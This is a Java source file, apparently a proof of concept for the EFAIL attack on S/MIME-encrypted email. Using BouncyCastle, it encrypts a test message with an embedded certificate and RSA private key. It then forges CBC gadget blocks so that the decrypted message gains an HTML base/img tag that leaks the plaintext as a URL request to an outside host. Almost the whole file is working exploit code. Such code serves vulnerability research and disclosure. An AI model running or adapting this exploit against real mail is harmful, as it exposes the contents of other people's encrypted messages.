
import java.io.*;
import java.lang.reflect.Field;
import java.security.PrivateKey;
import java.security.Security;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.*;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.InternetHeaders;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;

import org.bouncycastle.asn1.*;
import org.bouncycastle.asn1.cms.ContentInfo;
import org.bouncycastle.asn1.cms.EncryptedContentInfo;
import org.bouncycastle.asn1.x509.AlgorithmIdentifier;
import org.bouncycastle.cms.*;
import org.bouncycastle.cms.jcajce.JceCMSContentEncryptorBuilder;
import org.bouncycastle.cms.jcajce.JceKeyTransEnvelopedRecipient;
import org.bouncycastle.cms.jcajce.JceKeyTransRecipientId;
import org.bouncycastle.cms.jcajce.JceKeyTransRecipientInfoGenerator;
import org.bouncycastle.mail.smime.SMIMEEnveloped;
import org.bouncycastle.mail.smime.SMIMEEnvelopedGenerator;
import org.bouncycastle.mail.smime.SMIMEUtil;
import org.bouncycastle.openssl.PEMKeyPair;
import org.bouncycastle.openssl.PEMParser;
import org.bouncycastle.openssl.jcajce.JcaPEMKeyConverter;
import org.bouncycastle.operator.OutputEncryptor;

/**
 * Proof of concept for EFAIL vulnerabilty for SMIME messages.
 * https://efail.de/
 * Used BouncyCastle library.
 */
public class EFailPoC {

    private static final int BLOCK_SIZE = 16;
    private static final String BC_PROVIDER = "BC";
    private static byte[] KNOWN_HEADER = ("Content-Type: text/plain; charset=us-ascii\r\n" +
            "Content-Transfer-Encoding: 7bit\r\n\r\n").getBytes();
    private static final String MESSAGE_CONTENT = "DOCTYPE MESSAGE_CONTENT>\n" +
            "<html>\n" +
            "<body>\n" +
            "<h2>Secret Information</h2>\n" +
            "Mouse over this paragraph, to display the title attribute as a tooltip.\n" +
            "</body>\n" +
            "</html>";

    private static final String PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY-----\n" +
            "MIICXQIBAAKBgQDAvqAUfipaMn2ybE0B0q6SShsmAJp4mb3mFzh1oqslYwwZ5od1\n" +
            "yxaZhJcwyMr+New/aMV6KyI07Xt5wO19ZpS6bsfU8QxTdmPP7Jr1vU2XGU2Iq8kd\n" +
            "bYSVde1/9ENXGXyzxS5OeTjnntQk7eu4idQOE4wExC3w4u4fkr4wRBFt0QIDAQAB\n" +
            "AoGADrd/aZEokrKAPntedeEsSyc1Y3VwVf0HLuZe/TxqbPRfHCsp9KiJFTe2g5cR\n" +
            "SM+9Nio9ydI5TmlDoExG1ehbOq7jlGEJVq4v8bnDqvD+f4abcE0WTJsIaloc3Feh\n" +
            "D8V4bHuHnOawindmrmDV076XHCE+nDn0pYCziNKGynoPGbECQQDzC+OvxbdBkaed\n" +
            "65wN+Nsc4PpyQUwIA9xii+cIiJWd1TmZvDlae6QGJKY7zl70t5HthXPBtA1Iizl4\n" +
            "F3sCQgm/AkEAywRrzPRcYlIPQRuRG4KL1wdRAvbZTyUt/5JhPBRqytal9tlm21cX\n" +
            "ZeCEPuTXNTIJiLmMRiqElTekg9qiYxXMbwJBAO2obpfuKef/2XtebFZtRTTT+ZHH\n" +
            "r+UWgWYLj3qUtFiFq7FckGieBiHLrJFGlyuMZTFxEWQT//kzyppXu3zVvlkCQQCA\n" +
            "+Y8OxxNF90Hvp/a41mfGtMQ3sOD/kew2GCWjyIjL0i/fsd/RavPXaho55qH+DorW\n" +
            "DKLcFLjkH1Rp2+UcM8YLAkA6fKFgDrOH9+q5Gyh8oi+cEI9+OxRfA0+lbEjgZmJV\n" +
            "3b3e02Y7TIsAJvvoILfV8bHsjJhJZ+LeH8vJipYz3VFb\n" +
            "-----END RSA PRIVATE KEY-----";

    private static final String CERTIFICATE = "-----BEGIN CERTIFICATE-----\n" +
            "MIIDzjCCAragAwIBAgIBCTANBgkqhkiG9w0BAQUFADCBrDELMAkGA1UEBhMCQVQx\n" +
            "EDAOBgNVBAgTB0F1c3RyaWExDzANBgNVBAcTBlZpZW5uYTEaMBgGA1UEChMRVGlh\n" +
            "bmkgU3Bpcml0IEdtYkgxGTAXBgNVBAsTEERlbW8gRW52aXJvbm1lbnQxEDAOBgNV\n" +
            "BAMTB1Rlc3QgQ0ExMTAvBgkqhkiG9w0BCQEWIm1hc3NpbWlsaWFuby5tYXNpQHRp\n" +
            "YW5pLXNwaXJpdC5jb20wIBcNMTIxMDMwMTQ1NzM4WhgPMjE5MjA0MDUxNDU3Mzha\n" +
            "MIGsMQswCQYDVQQGEwJBVDEQMA4GA1UECBMHQXVzdHJpYTEaMBgGA1UEChMRVGlh\n" +
            "bmkgU3Bpcml0IEdtYkgxGTAXBgNVBAsTEFRlc3QgRW52aXJvbm1lbnQxJjAkBgNV\n" +
            "BAMUHW1hc3NpQGRpcmVjdC50aWFuaS1zcGlyaXQubmV0MSwwKgYJKoZIhvcNAQkB\n" +
            "Fh1tYXNzaUBkaXJlY3QudGlhbmktc3Bpcml0Lm5ldDCBnzANBgkqhkiG9w0BAQEF\n" +
            "AAOBjQAwgYkCgYEAwL6gFH4qWjJ9smxNAdKukkobJgCaeJm95hc4daKrJWMMGeaH\n" +
            "dcsWmYSXMMjK/jXsP2jFeisiNO17ecDtfWaUum7H1PEMU3Zjz+ya9b1NlxlNiKvJ\n" +
            "HW2ElXXtf/RDVxl8s8UuTnk4557UJO3ruInUDhOMBMQt8OLuH5K+MEQRbdECAwEA\n" +
            "AaN7MHkwCQYDVR0TBAIwADAsBglghkgBhvhCAQ0EHxYdT3BlblNTTCBHZW5lcmF0\n" +
            "ZWQgQ2VydGlmaWNhdGUwHQYDVR0OBBYEFGcrfTtTlFVvqFTJ6UXg+Dm62+d2MB8G\n" +
            "A1UdIwQYMBaAFGTCKG5ROUak0PGudkVtbzgVePvaMA0GCSqGSIb3DQEBBQUAA4IB\n" +
            "AQBbBUFZ27Z7qM5zf84j1XlekKFlurlpxZKA3U1YD2iRV+BucT4OyGdFnUuNvBTe\n" +
            "xEF2fSrDQvc9oKdPMibRuwWEb9Pxib0dbv/SN0rk848UAl1xWc3gDPggKUXy1F4M\n" +
            "pXHWZOqXHrZVugE6HTOEqlw8wFdfbiOGFX2SQVuIjqHL8QPrAL6e+E3ffJHZqGVt\n" +
            "0ZL2A7ki8Jpb2csyT9k52StUyUauzqOYYoKCI8TCrD2Fse0zUpICe0t1Zyxv0DnM\n" +
            "sSWLL3LyDjUTSUggJvyYi0B+GUxrNzlF2OVWVf/RWDuw8FOWcdduKfgpM+mG7jQp\n" +
            "uRowbbmsMs+i3kgni2uL6Zyk\n" +
            "-----END CERTIFICATE-----";

    public static void main(String args[]) throws Exception {
        Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
        Session session = Session.getDefaultInstance(System.getProperties(), null);

        createEncryptedMessage(session, MESSAGE_CONTENT, "encrypted.message");
        modifyEncrypted(session, "encrypted.message", "modified.encrypted.message");
        decrypt(session, "modified.encrypted.message", "decrypted.message");
    }

    private static void createEncryptedMessage(Session session, String html, String outPath) throws Exception {
        SMIMEEnvelopedGenerator generator = new SMIMEEnvelopedGenerator();
        generator.addRecipientInfoGenerator(new JceKeyTransRecipientInfoGenerator(getCertificate()).setProvider(BC_PROVIDER));
        MimeBodyPart bodyPart = new MimeBodyPart();
        bodyPart.setContent(html, "text/html; charset=utf-8");
        OutputEncryptor outputEncryptor = new JceCMSContentEncryptorBuilder(CMSAlgorithm.AES128_CBC)
                .setProvider(BC_PROVIDER)
                .build();
        MimeBodyPart encryptedBodyPart = generator.generate(bodyPart, outputEncryptor);
        Address fromUser = new InternetAddress("\"Josef \"<abc@bouncycastle.org>");
        Address toUser = new InternetAddress("test@bouncycastle.org");
        MimeMessage body = new MimeMessage(session);
        body.setFrom(fromUser);
        body.setRecipient(Message.RecipientType.TO, toUser);
        body.setSubject("Secret Email");
        body.setContent(encryptedBodyPart.getContent(), encryptedBodyPart.getContentType());
        body.saveChanges();
        body.writeTo(new FileOutputStream(outPath));
    }

    private static void modifyEncrypted(Session session, String inPath, String outPath) throws MessagingException, CMSException, IOException {
        MimeMessage encrypted = new MimeMessage(session, new FileInputStream(inPath));
        SMIMEEnveloped smimeEnveloped = new SMIMEEnveloped(encrypted);
        ContentInfo contentInfo = smimeEnveloped.toASN1Structure();
        ASN1Encodable modifiedContent = modify(contentInfo.getContent());
        ContentInfo modified = new ContentInfo(contentInfo.getContentType(), modifiedContent);
        byte[] modifiedBytes = toBase64(modified.getEncoded());

        InternetHeaders headers = new InternetHeaders();
        headers.addHeader("Content-Type", "application/pkcs7-mime; name=\"smime.p7m\"; smime-type=enveloped-data");
        headers.addHeader("Content-Transfer-Encoding", "base64");
        headers.addHeader("Content-Disposition", "attachment; filename=\"smime.p7m\"");
        headers.addHeader("Content-Description", "S/MIME Encrypted Message");

        MimeBodyPart mp = new MimeBodyPart(headers, modifiedBytes);
        mp.writeTo(new FileOutputStream(outPath));
    }

    private static void decrypt(Session session, String inPath, String outPath) throws Exception {
        RecipientId recipientId = new JceKeyTransRecipientId(getCertificate());
        MimeMessage encrypted = new MimeMessage(session, new FileInputStream(inPath));
        SMIMEEnveloped enveloped = new SMIMEEnveloped(encrypted);
        RecipientInformationStore recipients = enveloped.getRecipientInfos();
        RecipientInformation recipient = recipients.get(recipientId);
        MimeBodyPart decryptedBodyPart = SMIMEUtil.toMimeBodyPart(recipient.getContent(new JceKeyTransEnvelopedRecipient(getPrivateKey()).setProvider(BC_PROVIDER)));
        decryptedBodyPart.writeTo(new FileOutputStream(outPath));
    }

    private static ASN1Encodable modify(ASN1Encodable contentEnc) {
        EditableASN1Sequence content = new EditableASN1Sequence((ASN1Sequence) contentEnc);
        ASN1Encodable encrypted = content.getObjectAt(2);
        EncryptedContentInfo encryptedContentInfo = EncryptedContentInfo.getInstance(encrypted);

        ASN1OctetString encryptedContent = encryptedContentInfo.getEncryptedContent();
        byte[] cipherText = encryptedContent.getOctets();
        log("Original cipher text: " + Arrays.toString(cipherText));

        AlgorithmIdentifier algorithmIdentifier = encryptedContentInfo.getContentEncryptionAlgorithm();
        DEROctetString IV = (DEROctetString) algorithmIdentifier.getParameters();

        byte[] iv = IV.getOctets();
        log("Initial vector: " + Arrays.toString(iv));

        //Skip headers in cipher text
        int fullBlocks = KNOWN_HEADER.length / BLOCK_SIZE;
        int tail = KNOWN_HEADER.length % BLOCK_SIZE;
        //Blocks with headers, skip them for correct MIME parsing after decryption
        int skippBlocksCount = fullBlocks + (tail > 0 ? 1 : 0);
        log("Skip cipher text blocks(with headers) number: " + skippBlocksCount);
        byte[] blocksWithHeaders = Arrays.copyOfRange(cipherText, 0, skippBlocksCount * BLOCK_SIZE);

        // Structure of modified cypher text
        // | Headers Blocks | Open img html tag blocks | Decrypted email content blocks | Closing tag | Original 2 last blocks |
        // Insert 6 blocks with html
        //<base ignore="
        //"href="http:">
        //<img src="uk.ua/

        int insertedHtmlBlocks = 6;
        int closingTagInsertedBlocks = 2;
        int originalLastBlocksPadding = 2;

        int newLength = cipherText.length + (insertedHtmlBlocks + closingTagInsertedBlocks + originalLastBlocksPadding) * BLOCK_SIZE;
        byte[] modifiedCypherText = Arrays.copyOf(blocksWithHeaders, newLength);
        setModifiedEncryptedContent(encryptedContent, modifiedCypherText);

        insertGadget("<base ignore=\"  ".getBytes(), skippBlocksCount * BLOCK_SIZE, iv, cipherText, modifiedCypherText);
        insertGadget("\"href=\"http:\">  ".getBytes(), skippBlocksCount * BLOCK_SIZE + 2 * BLOCK_SIZE, iv, cipherText, modifiedCypherText);
        insertGadget("<img src=\"uk.ua/".getBytes(), skippBlocksCount * BLOCK_SIZE + 4 * BLOCK_SIZE, iv, cipherText, modifiedCypherText);

        //Copy blocks with encrypted content
        for (int i = 0; i < cipherText.length - skippBlocksCount * BLOCK_SIZE; i++) {
            modifiedCypherText[skippBlocksCount * BLOCK_SIZE + 6 * BLOCK_SIZE + i] = cipherText[skippBlocksCount * BLOCK_SIZE + i];
        }

        //Add two additional blocks, after decryption this block will be closing tag, like ">
        byte[] closingQuote = "            \">   ".getBytes();
        insertGadget(closingQuote, modifiedCypherText.length - 4 * BLOCK_SIZE, iv, cipherText, modifiedCypherText);

        //Just copy 2 original blocks to the end, for correct decryption(to not break padding)
        for (int i = 0; i < BLOCK_SIZE * 2; i++) {
            modifiedCypherText[modifiedCypherText.length - i - 1] = cipherText[cipherText.length - i - 1];
        }

        content.setObjectAt(2, encryptedContentInfo.toASN1Primitive());
        return content;
    }


    private static void insertGadget(byte[] textAfterDecryption, int position, byte[] iv, byte[] cipherText, byte[] modifiedCypherText) {
        byte[] gadget = new byte[BLOCK_SIZE * 2];
        for (int i = 0; i < BLOCK_SIZE; i++) {
            gadget[i] = (byte) (iv[i] ^ KNOWN_HEADER[i] ^ textAfterDecryption[i]);
        }
        System.arraycopy(cipherText, 0, gadget, 16, BLOCK_SIZE);
        System.arraycopy(gadget, 0, modifiedCypherText, position, BLOCK_SIZE * 2);
    }

    private static void setModifiedEncryptedContent(ASN1OctetString encryptedContent, byte[] modifiedCypherText) {
        try {
            Field field = encryptedContent.getClass().getSuperclass().getDeclaredField("string");
            field.setAccessible(true);
            field.set(encryptedContent, modifiedCypherText);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            log("Error while setting modified encrypted content" + Arrays.toString(e.getStackTrace()));
        }
    }

    private static byte[] toBase64(byte[] data) {
        return Base64.getMimeEncoder().encode(data);
    }

    private static void log(Object o) {
        System.out.println(o);
    }

    private static X509Certificate getCertificate() throws Exception {
        return (X509Certificate) CertificateFactory.getInstance("X.509", BC_PROVIDER)
                .generateCertificate(new ByteArrayInputStream(CERTIFICATE.getBytes()));
    }

    private static PrivateKey getPrivateKey() throws Exception {
        return new JcaPEMKeyConverter()
                .setProvider(BC_PROVIDER)
                .getKeyPair((PEMKeyPair) (new PEMParser(new InputStreamReader(new ByteArrayInputStream(PRIVATE_KEY.getBytes())))).readObject()).getPrivate();
    }

    static class EditableASN1Sequence extends BERSequence {

        EditableASN1Sequence(ASN1Sequence sequence) {
            seq = new Vector();
            Enumeration enumeration = sequence.getObjects();
            while (enumeration.hasMoreElements()) {
                seq.add(enumeration.nextElement());
            }
        }

        void setObjectAt(int index, Object object) {
            seq.set(index, object);
        }

        public ASN1Encodable getObjectAt(int var1) {
            return (ASN1Encodable) seq.elementAt(var1);
        }
    }

}